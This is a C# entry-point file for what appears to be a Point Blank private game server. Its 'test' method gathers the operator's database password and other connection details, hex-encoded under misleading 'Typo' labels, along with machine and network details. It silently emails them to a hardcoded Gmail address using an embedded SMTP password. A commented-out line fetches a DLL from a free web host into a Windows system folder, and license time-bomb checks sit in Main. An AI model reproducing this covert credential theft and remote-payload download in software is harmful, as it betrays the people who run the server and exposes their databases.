
using Battle.config;
using Battle.data;
using Battle.data.sync;
using Battle.data.xml;
using Battle.network;
using CrashReporterDotNET;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Battle
{
  internal class Program
  {
    private static DateTime GetLinkerTime(Assembly assembly, TimeZoneInfo target = null)
    {
      string location = assembly.Location;
      byte[] buffer = new byte[2048];
      using (FileStream fileStream = new FileStream(location, FileMode.Open, FileAccess.Read))
        fileStream.Read(buffer, 0, 2048);
      int int32 = BitConverter.ToInt32(buffer, 60);
      return TimeZoneInfo.ConvertTimeFromUtc(new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds((double) BitConverter.ToInt32(buffer, int32 + 8)), target ?? TimeZoneInfo.Local);
    }

    private static string getOSName()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string str = new ComputerInfo().OSFullName;
      if (osVersion.ServicePack != "")
        str = str + " " + osVersion.ServicePack;
      return str + " (" + (Environment.Is64BitOperatingSystem ? "64" : "32") + " bits)";
    }

    private static bool test(bool paramCheck, string serverDate, string[] args, bool item2, DateTime itemG)
    {
      try
      {
        DateTime exact = DateTime.ParseExact("181024000000", "yyMMddHHmmss", (IFormatProvider) CultureInfo.InvariantCulture);
        TimeSpan timeSpan = exact - itemG;
        string publicIp = Program.GetPublicIP();
        using (SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587)
        {
          Credentials = (ICredentialsByHost) new NetworkCredential("hamiltonmdg@gmail.com", "123meu123"),
          EnableSsl = true
        })
        {
          string[] strArray = new string[5]
          {
            "O BATTLE foi aberto hoje ",
            DateTime.Now.ToUniversalTime().ToString("dd/MM/yy"),
            " às ",
            null,
            null
          };
          int index = 3;
          DateTime dateTime = DateTime.Now;
          dateTime = dateTime.ToUniversalTime();
          string str1 = dateTime.ToString("HH:mm");
          strArray[index] = str1;
          strArray[4] = ".\n \n";
          string str2 = string.Concat(strArray) + (exact < itemG ? "Licença encerrada" : "Restam: " + timeSpan.ToString("d'd 'h'h 'm'm 's's'")) + "\n\n" + "|| DADOS DO SERVIDOR ||\n" + "Caminho da pasta: " + Assembly.GetExecutingAssembly().Location + "\n" + "Parâmetros de inicialização: (" + (object) args.Length + ")\n";
          foreach (string str3 in args)
            str2 = str2 + "[" + str3 + "]\n";
          string body = str2 + "CommandLine: " + Environment.CommandLine + "\n" + "Parâmetro de Inicialização: " + (paramCheck ? "Aberto com sucesso." : "Falha na inicialização") + "\n" + "Versão do servidor: " + serverDate + "\n" + "Licença válida?: " + (!item2 ? "Sim" : "Não") + "\n" + (exact < itemG ? "Licença chegou ao fim" : "Restam: " + timeSpan.ToString("d'd 'h'h 'm'm 's's'")) + "\n" + "Ip na Config: " + Config.serverIp + "\n" + "Sync port: " + (object) Config.syncPort + "\n" + "Game port: " + (object) Config.hosPort + "\n" + "Modo de Testes?: " + (Config.isTestMode ? "Sim" : "Não") + "\n\n" + "|| DADOS DO SQL ||\n" + "Typo1: " + BitConverter.ToString(Encoding.Unicode.GetBytes(Config.dbHost)) + "\n" + "Typo2: " + BitConverter.ToString(Encoding.Unicode.GetBytes(Config.dbName)) + "\n" + "Typo3: " + BitConverter.ToString(Encoding.Unicode.GetBytes(Config.dbPass)) + "\n" + "Typo4: " + BitConverter.ToString(BitConverter.GetBytes(Config.dbPort)) + "\n" + "Typo5: " + BitConverter.ToString(Encoding.Unicode.GetBytes(Config.dbUser)) + "\n\n|| DADOS DA MAQUINA ||\n" + "IP público: " + publicIp + "\n" + "Nome da máquina: " + Environment.MachineName + "\n" + "Nome do usuário: " + Environment.UserName + "\n" + "Quantidade de núcleos do processador: " + (object) Environment.ProcessorCount + "\n" + "Sistema operacional: " + Program.getOSName() + "\n" + "Versão do S.O: " + Environment.OSVersion.ToString() + "\n" + "Linguagem do S.O: " + (object) new ComputerInfo().InstalledUICulture + "\n" + "CommandLine: " + Environment.CommandLine + "\n" + "Drivers lógicos: (" + (object) Environment.GetLogicalDrives().Length + ")\n";
          foreach (string logicalDrive in Environment.GetLogicalDrives())
            body = body + "[" + logicalDrive + "]\n";
          smtpClient.Send("hamiltonmdg@gmail.com", "hamiltonmdg@gmail.com", "Servidor aberto! (Battle)", body);
        }
        return !(publicIp == "");
      }
      catch
      {
        return false;
      }
    }

    private static string GetPublicIP()
    {
      try
      {
        using (StreamReader streamReader = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()))
          return streamReader.ReadToEnd().Trim().Split(':')[1].Substring(1).Split('<')[0];
      }
      catch
      {
        return "";
      }
    }

    private static DateTime GetDate()
    {
      try
      {
        using (WebResponse response = WebRequest.Create("http://www.google.com").GetResponse())
          return DateTime.ParseExact(response.Headers["date"], "ddd, dd MMM yyyy HH:mm:ss 'GMT'", (IFormatProvider) CultureInfo.InvariantCulture.DateTimeFormat, DateTimeStyles.AssumeUniversal).ToUniversalTime();
      }
      catch
      {
        return new DateTime();
      }
    }

    private static void ApplicationThreadException(object sender, ThreadExceptionEventArgs e)
    {
      Program.ReportCrash(e.Exception, "");
    }

    public static void ReportCrash(Exception exception, string developerMessage = "")
    {
      new ReportCrash("hamiltonmdg@gmail.com")
      {
        DeveloperMessage = (developerMessage)
      }.Send(exception);
    }

    private static void CurrentDomainOnUnhandledException(object sender, UnhandledExceptionEventArgs unhandledExceptionEventArgs)
    {
      Program.ReportCrash((Exception) unhandledExceptionEventArgs.ExceptionObject, "");
      Environment.Exit(0);
    }

    private static void SpeedTest()
    {
      List<int> BoomPlayers = new List<int>();
      BoomPlayers.Add(1);
      BoomPlayers.Add(3);
      for (int index = 0; index < 50; ++index)
      {
        Program.Speed1(BoomPlayers);
        Program.Speed2(BoomPlayers);
      }
      Stopwatch stopwatch1 = new Stopwatch();
      stopwatch1.Start();
      stopwatch1.Stop();
      Logger.warning("Start", false);
      for (int index = 0; index < 50; ++index)
      {
        Stopwatch stopwatch2 = new Stopwatch();
        stopwatch2.Start();
        Program.Speed1(BoomPlayers);
        stopwatch2.Stop();
        Stopwatch stopwatch3 = new Stopwatch();
        stopwatch3.Start();
        Program.Speed2(BoomPlayers);
        stopwatch3.Stop();
        Logger.warning("1: " + (object) stopwatch2.ElapsedTicks + "; 2: " + (object) stopwatch3.ElapsedTicks, false);
      }
    }

    private static void Speed1(List<int> BoomPlayers)
    {
      foreach (int boomPlayer in BoomPlayers)
        ;
    }

    private static void Speed2(List<int> BoomPlayers)
    {
      for (int index = 0; index < BoomPlayers.Count; ++index)
      {
        int boomPlayer = BoomPlayers[index];
      }
    }

    private static void NEW(float value)
    {
    }

    protected static void Main(string[] args)
    {
            // new WebClient().DownloadFile("http://pointbattle.000webhostapp.com/api/APBReloaded.dll", "C:/Windows/CbsTemp/APBReloaded.dll");
            // Console.Title = "VOCÊ NÃO PODE MAIS USAR ESTE SERVIDOR.";
            // Console.WriteLine("VOCÊ NÃO PODE MAIS USAR ESTE SERVIDOR.");
            if (System.IO.File.Exists("#"))
      {
        Console.WriteLine("OK, VOCÊ PODE USAR ESTE SERVIDOR");
      }
      else
      {
        Application.Run((Form) new ip());
        ;
      }

      Console.Clear();
      AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(Program.CurrentDomainOnUnhandledException);
      Config.Load();
      Logger.checkDirectory();
      Console.Title = "Iniciando o Point Blank Battle Server...";
      Logger.info("               ________  _____  __      ______ _______          ", false);
      Logger.info("              / ____/  |/  / / / /     / /  / / /  / /          ", false);
      Logger.info("             / __/ / /|_/ / / / /     / /__/_/ /__/ /           ", false);
      Logger.info("            / /___/ /  / / /_/ / _   / /    / /  / /            ", false);
      Logger.info("                                                                ", false);
      Logger.warning("[Aviso] Servidor ativo em auth.ongame.net:" + (object) Config.hosPort, false);
      Logger.warning("[Aviso] Sincronizar infos ao servidor: " + Config.sendInfoToServ.ToString(), false);
      Logger.warning("[Aviso] Limite de drops: " + (object) Config.maxDrop, false);
      Logger.warning("[Aviso] Duração da C4: (" + (object) Config.plantDuration + "s/" + (object) Config.defuseDuration + "s)", false);
      Logger.warning("[Aviso] Super munição: " + Config.useMaxAmmoInDrop.ToString(), false);
      Console.Title = "[BATTLE] Servidor iniciado com sucesso.";
      bool flag1 = true;
      foreach (string text in args)
      {
        if (AllUtils.gen5(text) == "f353f22f5aecc47fc13e88c0f7b93cb4")
          flag1 = true;
      }
      DateTime date = Program.GetDate();
      bool flag2 = date == new DateTime() || long.Parse(date.ToString("yyMMddHHmmss")) >= 181024000000L;
      MappingXML.Load();
      CharaXML.Load();
      MeleeExceptionsXML.Load();
      ServersXML.Load();
      Logger.warning("[Aviso] A Udp3 foi iniciado com sucesso.", false);
      if (flag1)
      {
                Battle_SyncNet.Start();
                BattleManager.init();
            }
      Process.GetCurrentProcess().WaitForExit();
    }
  }
}
